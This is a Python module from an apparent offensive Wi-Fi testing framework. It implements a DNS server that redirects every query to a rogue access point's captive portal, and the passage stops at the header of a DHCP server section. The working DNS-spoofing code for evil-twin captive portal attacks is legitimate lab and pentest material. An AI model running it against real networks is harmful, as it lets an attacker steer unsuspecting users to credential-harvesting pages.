#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""Native DNS and DHCP servers for captive portal attacks.

Replaces dnsmasq with 100% Python implementations:
  - CaptiveDNSServer: redirect all DNS queries to portal IP (dnslib)
  - CaptiveDHCPServer: allocate IPs on rogue AP subnet (Scapy BOOTP)
  - CaptiveNetwork: convenience class that manages both servers as threads

Dependencies:
  - dnslib (pip install dnslib): pure-Python DNS server
  - scapy: DHCP/BOOTP packet handling

OS requirement: Linux only (raw sockets).

Version: 1.0.0
"""


import ipaddress
import logging
import threading
import time
from typing import Dict, List, Optional

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Optional dependency: dnslib
# ---------------------------------------------------------------------------

try:
    import dnslib
    import dnslib.server

    HAS_DNSLIB = True
except ImportError:
    HAS_DNSLIB = False

# ---------------------------------------------------------------------------
# Optional dependency: Scapy
# ---------------------------------------------------------------------------

try:
    from scapy.all import (  # type: ignore[import-untyped]
        BOOTP,
        DHCP,
        IP,
        UDP,
        Ether,
        get_if_hwaddr,
        sendp,
        sniff,
    )

    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


# ---------------------------------------------------------------------------
# Internal dnslib resolver (defined only when dnslib is available)
# ---------------------------------------------------------------------------

if HAS_DNSLIB:

    class _CaptiveResolver(dnslib.server.BaseResolver):
        """DNS resolver that redirects every query to the captive portal IP.

        All A and ANY queries receive an A record pointing at portal_ip.
        AAAA queries receive an empty NOERROR answer so clients fall back
        to A. MX, NS, and SOA queries receive minimal valid responses to
        avoid client-side timeouts.
        """

        def __init__(self, portal_ip: str) -> None:
            """Initialize with the redirect target.

            Args:
                portal_ip: IPv4 address to return for all A/ANY queries.
            """
            self._portal_ip = portal_ip

        def resolve(self, request: object, handler: object) -> object:
            """Build a DNS reply redirecting the query to the portal IP.

            Args:
                request: Incoming dnslib DNSRecord object.
                handler: Active dnslib DNSHandler instance.

            Returns:
                dnslib DNSRecord reply with spoofed answer.
            """
            reply = request.reply()
            qname = request.q.qname
            qtype = request.q.qtype

            if qtype in (dnslib.QTYPE.A, dnslib.QTYPE.ANY):
                reply.add_answer(
                    dnslib.RR(
                        rname=qname,
                        rtype=dnslib.QTYPE.A,
                        rdata=dnslib.A(self._portal_ip),
                        ttl=300,
                    )
                )
            elif qtype == dnslib.QTYPE.AAAA:
                # Return empty answer; client will fall back to A record.
                pass
            elif qtype == dnslib.QTYPE.MX:
                reply.add_answer(
                    dnslib.RR(
                        rname=qname,
                        rtype=dnslib.QTYPE.MX,
                        rdata=dnslib.MX(qname),
                        ttl=300,
                    )
                )
            elif qtype == dnslib.QTYPE.NS:
                reply.add_answer(
                    dnslib.RR(
                        rname=qname,
                        rtype=dnslib.QTYPE.NS,
                        rdata=dnslib.NS(qname),
                        ttl=300,
                    )
                )
            elif qtype == dnslib.QTYPE.SOA:
                qname_str = str(qname).rstrip(".")
                mname = dnslib.DNSLabel(f"ns.{qname_str}.")
                rname = dnslib.DNSLabel(f"hostmaster.{qname_str}.")
                reply.add_answer(
                    dnslib.RR(
                        rname=qname,
                        rtype=dnslib.QTYPE.SOA,
                        rdata=dnslib.SOA(
                            mname=mname,
                            rname=rname,
                            times=(int(time.time()), 3600, 900, 86400, 300),
                        ),
                        ttl=300,
                    )
                )

            return reply


# ---------------------------------------------------------------------------
# CaptiveDNSServer
# ---------------------------------------------------------------------------


class CaptiveDNSServer:
    """UDP DNS server that redirects all queries to the captive portal IP.

    Uses dnslib for a pure-Python DNS implementation. The server starts
    in a daemon thread and returns control immediately. If dnslib is not
    installed, start() raises ImportError with a clear install message.

    Example:
        dns = CaptiveDNSServer(portal_ip="10.0.0.1")
        dns.start()
        # ... do work ...
        dns.stop()
    """

    def __init__(self, portal_ip: str = "10.0.0.1", port: int = 53) -> None:
        """Initialize the DNS server configuration.

        Args:
            portal_ip: IPv4 address returned for all A/ANY queries.
            port: UDP port to bind on (default 53, requires root).
        """
        self._portal_ip = portal_ip
        self._port = port
        self._dns_server: object | None = None
        self._thread: threading.Thread | None = None
        self._running: bool = False

    @property
    def is_running(self) -> bool:
        """Return True while the DNS daemon thread is alive."""
        return self._running and self._thread is not None and self._thread.is_alive()

    def start(self) -> None:
        """Start the DNS server in a background daemon thread.

        Raises:
            ImportError: If dnslib is not installed.
            RuntimeError: If the server is already running.
        """
        if not HAS_DNSLIB:
            raise ImportError(
                "dnslib is required for CaptiveDNSServer. "
                "Install with: pip install dnslib"
            )
        if self._running:
            raise RuntimeError("CaptiveDNSServer is already running.")

        resolver = _CaptiveResolver(self._portal_ip)
        self._dns_server = dnslib.server.DNSServer(
            resolver,
            port=self._port,
            address="0.0.0.0",
            server=dnslib.server.UDPServer,
        )
        self._thread = threading.Thread(
            target=self._dns_server.start,
            daemon=True,
            name="CaptiveDNS",
        )
        self._thread.start()
        self._running = True
        logger.info(
            "CaptiveDNSServer started on UDP/%d redirecting to %s",
            self._port,
            self._portal_ip,
        )

    def stop(self) -> None:
        """Signal the server to stop and wait for the thread to exit."""
        if not self._running:
            return
        if self._dns_server is not None:
            try:
                self._dns_server.stop()
            except Exception as exc:
                logger.debug("DNS server stop error: %s", exc)
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3.0)
        self._thread = None
        logger.info("CaptiveDNSServer stopped")


# ---------------------------------------------------------------------------
# CaptiveDHCPServer
# ---------------------------------------------------------------------------


